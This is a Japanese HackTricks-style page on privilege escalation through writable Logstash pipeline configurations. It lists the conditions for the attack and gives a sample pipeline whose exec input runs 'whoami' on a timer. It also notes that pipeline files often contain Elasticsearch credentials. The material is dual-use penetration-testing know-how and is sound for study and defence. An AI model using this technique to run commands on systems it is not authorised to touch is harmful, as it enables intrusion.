{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstashは**ログを収集、変換、配信する**ために使用されるシステムで、**パイプライン**として知られています。これらのパイプラインは**入力**、**フィルター**、および**出力**のステージで構成されています。Logstashが侵害されたマシンで動作する際に興味深い側面が現れます。

### パイプラインの設定

パイプラインは**/etc/logstash/pipelines.yml**ファイルで設定されており、パイプライン設定の場所がリストされています：
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
このファイルは、パイプライン構成を含む **.conf** ファイルがどこにあるかを明らかにします。**Elasticsearch output module** を使用する際、**pipelines** に **Elasticsearch credentials** が含まれることが一般的で、これは Logstash が Elasticsearch にデータを書き込む必要があるため、しばしば広範な権限を持っています。構成パスのワイルドカードにより、Logstash は指定されたディレクトリ内のすべての一致するパイプラインを実行できます。

### 書き込み可能なパイプラインによる特権昇格

特権昇格を試みるには、まず Logstash サービスが実行されているユーザーを特定します。通常は **logstash** ユーザーです。次の **いずれか** の条件を満たしていることを確認してください：

- パイプライン **.conf** ファイルへの **書き込みアクセス** を持っている **または**
- **/etc/logstash/pipelines.yml** ファイルがワイルドカードを使用しており、ターゲットフォルダーに書き込むことができる

さらに、次の **いずれか** の条件を満たす必要があります：

- Logstash サービスを再起動する能力 **または**
- **/etc/logstash/logstash.yml** ファイルに **config.reload.automatic: true** が設定されている

構成にワイルドカードがある場合、このワイルドカードに一致するファイルを作成することでコマンドを実行できます。例えば：
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
ここで、**interval** は実行頻度を秒単位で決定します。与えられた例では、**whoami** コマンドが120秒ごとに実行され、その出力は **/tmp/output.log** に向けられます。

**/etc/logstash/logstash.yml** に **config.reload.automatic: true** を設定すると、Logstash は再起動することなく新しいまたは変更されたパイプライン構成を自動的に検出して適用します。ワイルドカードがない場合でも、既存の構成に対して変更を加えることは可能ですが、中断を避けるために注意が必要です。

## References

{{#include ../../banners/hacktricks-training.md}}
